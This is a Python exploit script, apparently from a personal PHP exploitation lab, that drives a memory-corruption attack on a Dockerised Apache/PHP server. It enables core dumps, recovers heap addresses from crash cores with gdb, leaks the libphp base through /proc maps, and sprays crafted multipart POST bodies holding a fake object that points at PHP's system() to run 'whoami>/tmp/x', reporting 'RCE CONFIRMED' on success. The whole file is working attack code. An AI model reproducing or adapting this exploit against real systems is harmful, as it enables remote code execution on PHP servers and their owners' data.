#!/usr/bin/env python3
"""oom90: FINAL — per-boot slot probe + core-measured VA0 + hybrid aim.

Laws (all measured):
  - tiles land CONTIGUOUSLY at stride 176 (core scan: 16848 copies);
    copy N object header P_N = VA0 + N*176 + 8
  - walk slot S varies per boot/arm (32 in oom85, 8 in oom88/89)
  - marker tile rdi encodes slot: rdi = 0x5a5a5a5a5a5a5a00 | (S/8)
  - VA0 must come from the CORE (maps-heap guess is a different region!)
  - aim value = VA0 + 176 + 8 (next copy's header: rc=1, intact template)
Cycle:
  1. marker arm -> crash -> S (from rdi) + VA0 (from core: VA of that
     exact marker = VA0 + S)
  2. hybrid arm: template + T[S]=VA0+184 + markers elsewhere ->
     fires; crash MARK|k -> S=k, loop; /tmp/x -> WIN.
"""
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0
MARK = 0x5a5a5a5a5a5a5a00


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def marker_tile():
    T = bytearray(176)
    for s in range(0, 176, 8):
        struct.pack_into("<Q", T, s, MARK | (s // 8))
    return bytes(T)


def hybrid_tile(libphp_base, VA0, S):
    T = bytearray(176)
    struct.pack_into("<IIII", T, 8, 1, 0x208, 1, 0)
    struct.pack_into("<I", T, 52, 1)
    struct.pack_into("<QII", T, 88, VA0 + 112, 6, 0)
    struct.pack_into("<IIQ", T, 112, 1, 0x106, 0)
    struct.pack_into("<Q", T, 128, len(CMD))
    T[136:136 + len(CMD)] = CMD
    T[136 + len(CMD)] = 0
    struct.pack_into("<QQ", T, 152, 0, libphp_base + ZIF_SYSTEM)
    for s in range(0, 176, 8):
        struct.pack_into("<Q", T, s, MARK | (s // 8))
    # aim: walked slot -> next copy's object header (rc=1, template)
    struct.pack_into("<Q", T, S, VA0 + 176 + 8)
    return bytes(T)


def fetch_core(tag):
    sh("docker cp php_vuln:/tmp/core /tmp/c90_%s" % tag, 240)
    sh("docker cp /tmp/c90_%s phpbuild:/tmp/c90_%s" % (tag, tag), 240)
    return "/tmp/c90_%s" % tag


def gdb_rdi(core_in_build):
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi\" /tmp/libphp.69.so /tmp/%s'" % core_in_build, 240)
    m = re.search(r"rdi\s+0x([0-9a-f]+)", out)
    return int(m.group(1), 16) if m else None


def core_marker_va(core_host, mark_bytes):
    """VA of the first occurrence of this exact marker in the core."""
    data = open(core_host, "rb").read()
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]
    segs = []
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if struct.unpack_from("<I", data, o)[0] != 1:
            continue
        p_off, p_vaddr = struct.unpack_from("<QQ", data, o + 8)
        p_filesz = struct.unpack_from("<Q", data, o + 0x20)[0]
        if p_filesz:
            segs.append((p_vaddr, p_filesz, p_off))
    pos = 0
    while True:
        i = data.find(mark_bytes, pos)
        if i < 0:
            return None
        for va, sz, o in segs:
            if o <= i < o + sz:
                return va + (i - o)
        pos = i + 1


def check_x():
    x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    return "No such" not in x, x


def fire_cycle(tag, tile, n_finish=3):
    """warm + sacrifice + finishers. Returns dict(slot, x, raw_rdi)."""
    for i, k1 in enumerate(P.K1S[:-1]):
        post(P.build_attack(k1, 9100000 + i * 100000, value_tile=tile))
        hit, x = check_x()
        if hit:
            return {"x": x}
    post(P.build_attack(3400, 9200000, value_tile=tile))
    hit, x = check_x()
    if hit:
        return {"x": x}
    for fi in range(n_finish):
        sb = 9210000 + fi * 4
        code, resp = post(P.build_attack(3400, sb, value_tile=tile))
        t2 = "fatal" if b"Fatal" in resp else ("clean" if code == "200" else "crash")
        print("  [%s] fire%d (%d): %s [%s]" % (tag, fi, sb, code, t2), flush=True)
        time.sleep(2)
        hit, x = check_x()
        if hit:
            return {"x": x}
        if code != "200":
            time.sleep(3)
            cb = fetch_core("%s%d" % (tag, fi))
            rdi = gdb_rdi("c90_%s%d" % (tag, fi))
            return {"rdi": rdi, "core": cb}
    return {}


print("=== oom90: FINAL converge (probe + core-VA0 + hybrid aim) ===", flush=True)
boot_core_env()
pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
base = None
for ln in maps.splitlines():
    if "libphp.so" in ln and ln.split()[1].startswith("r"):
        base = int(ln.split()[0].split("-")[0], 16)
        break
print("    libphp = 0x%x" % base, flush=True)

S = None
VA0 = None
for cycle in range(3):
    if S is None or VA0 is None:
        print("[cycle %d] PROBE", cycle + 1, flush=True)
        r = fire_cycle("p%d" % cycle, marker_tile())
    else:
        print("[cycle %d] HYBRID AIM at slot %d, aim=VA0+184=0x%x"
              % (cycle + 1, S, VA0 + 184), flush=True)
        r = fire_cycle("a%d" % cycle, hybrid_tile(base, VA0, S))
    if "x" in r:
        print("    /tmp/x: [%s]" % r["x"], flush=True)
        print("*** RCE CONFIRMED ***", flush=True)
        sys.exit(0)
    rdi = r.get("rdi")
    if rdi is None:
        print("    no crash, no x — re-probing", flush=True)
        S = None
        continue
    if (rdi & ~0xFF) == MARK:
        S = (rdi & 0xFF) * 8
        mb = struct.pack("<Q", rdi)
        VA0 = core_marker_va(r["core"], mb)
        VA0 = VA0 - S if VA0 else None
        print("    rdi=0x%x -> slot=%d VA0=%s" % (rdi, S, hex(VA0) if VA0 else None), flush=True)
        if VA0 is None:
            print("[ABORT] marker not in core", flush=True)
            sys.exit(1)
    else:
        print("    rdi=0x%x (not marker) — dec landed somewhere; /tmp/x checked", flush=True)
        break

print("[RESULT] S=%s VA0=%s" % (S, hex(VA0) if VA0 else None), flush=True)
print("[restore]", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
